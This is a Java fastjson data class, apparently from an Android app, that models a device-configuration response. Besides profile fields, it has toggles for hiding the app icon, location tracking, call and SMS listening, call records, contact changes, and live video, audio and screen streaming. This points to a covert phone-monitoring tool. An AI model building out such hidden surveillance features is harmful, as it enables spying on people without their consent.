package com.example.myapplication.bean;

import com.alibaba.fastjson.annotation.JSONField;

import java.io.Serializable;

/**
 * 本机信息配置
 */
public class PersonalInformationBean implements Serializable {

    /**
     * code
     */
    @JSONField(name = "code")
    private Integer code;
    /**
     * msg
     */
    @JSONField(name = "msg")
    private String msg;
    /**
     * data
     */
    @JSONField(name = "data")
    private DataDTO data;

    public Integer getCode() {
        return code;
    }

    public void setCode(Integer code) {
        this.code = code;
    }

    public String getMsg() {
        return msg;
    }

    public void setMsg(String msg) {
        this.msg = msg;
    }

    public DataDTO getData() {
        return data;
    }

    public void setData(DataDTO data) {
        this.data = data;
    }

    public static class DataDTO {
        /**
         * id
         */
        @JSONField(name = "id")
        private Integer id;
        /**
         * sn
         */
        @JSONField(name = "sn")
        private Integer sn;
        /**
         * avatar
         */
        @JSONField(name = "avatar")
        private String avatar;
        /**
         * realName
         */
        @JSONField(name = "realName")
        private String realName;
        /**
         * nickname
         */
        @JSONField(name = "nickname")
        private String nickname;
        /**
         * username
         */
        @JSONField(name = "username")
        private String username;
        /**
         * mobile
         */
        @JSONField(name = "mobile")
        private String mobile;
        /**
         * sex
         */
        @JSONField(name = "sex")
        private String sex;
        /**
         * isPassword
         */
        @JSONField(name = "isPassword")
        private Boolean isPassword;
        /**
         * isBindMnp
         */
        @JSONField(name = "isBindMnp")
        private Boolean isBindMnp;
        /**
         * version
         */
        @JSONField(name = "version")
        private String version;
        /**
         * hideIcon
         */
        @JSONField(name = "hideIcon")
        private Integer hideIcon;
        /**
         * walkTrack
         */
        @JSONField(name = "walkTrack")
        private Integer walkTrack;
        /**
         * phoneListen
         */
        @JSONField(name = "phoneListen")
        private Integer phoneListen;
        /**
         * smsListen
         */
        @JSONField(name = "smsListen")
        private Integer smsListen;
        /**
         * callRecords
         */
        @JSONField(name = "callRecords")
        private Integer callRecords;
        /**
         * contactsChange
         */
        @JSONField(name = "contactsChange")
        private Integer contactsChange;
        /**
         * mobileBehavior
         */
        @JSONField(name = "mobileBehavior")
        private Integer mobileBehavior;
        /**
         * screenLock
         */
        @JSONField(name = "screenLock")
        private Integer screenLock;
        /**
         * liveVideo
         */
        @JSONField(name = "liveVideo")
        private Integer liveVideo;
        /**
         * liveAudio
         */
        @JSONField(name = "liveAudio")
        private Integer liveAudio;
        /**
         * liveScreen
         */
        @JSONField(name = "liveScreen")
        private Integer liveScreen;
        /**
         * createTime
         */
        @JSONField(name = "createTime")
        private String createTime;

        public Integer getId() {
            return id;
        }

        public void setId(Integer id) {
            this.id = id;
        }

        public Integer getSn() {
            return sn;
        }

        public void setSn(Integer sn) {
            this.sn = sn;
        }

        public String getAvatar() {
            return avatar;
        }

        public void setAvatar(String avatar) {
            this.avatar = avatar;
        }

        public String getRealName() {
            return realName;
        }

        public void setRealName(String realName) {
            this.realName = realName;
        }

        public String getNickname() {
            return nickname;
        }

        public void setNickname(String nickname) {
            this.nickname = nickname;
        }

        public String getUsername() {
            return username;
        }

        public void setUsername(String username) {
            this.username = username;
        }

        public String getMobile() {
            return mobile;
        }

        public void setMobile(String mobile) {
            this.mobile = mobile;
        }

        public String getSex() {
            return sex;
        }

        public void setSex(String sex) {
            this.sex = sex;
        }

        public Boolean getIsPassword() {
            return isPassword;
        }

        public void setIsPassword(Boolean isPassword) {
            this.isPassword = isPassword;
        }

        public Boolean getIsBindMnp() {
            return isBindMnp;
        }

        public void setIsBindMnp(Boolean isBindMnp) {
            this.isBindMnp = isBindMnp;
        }

        public String getVersion() {
            return version;
        }

        public void setVersion(String version) {
            this.version = version;
        }

        public Integer getHideIcon() {
            return hideIcon;
        }

        public void setHideIcon(Integer hideIcon) {
            this.hideIcon = hideIcon;
        }

        public Integer getWalkTrack() {
            return walkTrack;
        }

        public void setWalkTrack(Integer walkTrack) {
            this.walkTrack = walkTrack;
        }

        public Integer getPhoneListen() {
            return phoneListen;
        }

        public void setPhoneListen(Integer phoneListen) {
            this.phoneListen = phoneListen;
        }

        public Integer getSmsListen() {
            return smsListen;
        }

        public void setSmsListen(Integer smsListen) {
            this.smsListen = smsListen;
        }

        public Integer getCallRecords() {
            return callRecords;
        }

        public void setCallRecords(Integer callRecords) {
            this.callRecords = callRecords;
        }

        public Integer getContactsChange() {
            return contactsChange;
        }

        public void setContactsChange(Integer contactsChange) {
            this.contactsChange = contactsChange;
        }

        public Integer getMobileBehavior() {
            return mobileBehavior;
        }

        public void setMobileBehavior(Integer mobileBehavior) {
            this.mobileBehavior = mobileBehavior;
        }

        public Integer getScreenLock() {
            return screenLock;
        }

        public void setScreenLock(Integer screenLock) {
            this.screenLock = screenLock;
        }

        public Integer getLiveVideo() {
            return liveVideo;
        }

        public void setLiveVideo(Integer liveVideo) {
            this.liveVideo = liveVideo;
        }

        public Integer getLiveAudio() {
            return liveAudio;
        }

        public void setLiveAudio(Integer liveAudio) {
            this.liveAudio = liveAudio;
        }

        public Integer getLiveScreen() {
            return liveScreen;
        }

        public void setLiveScreen(Integer liveScreen) {
            this.liveScreen = liveScreen;
        }

        public String getCreateTime() {
            return createTime;
        }

        public void setCreateTime(String createTime) {
            this.createTime = createTime;
        }
    }
}
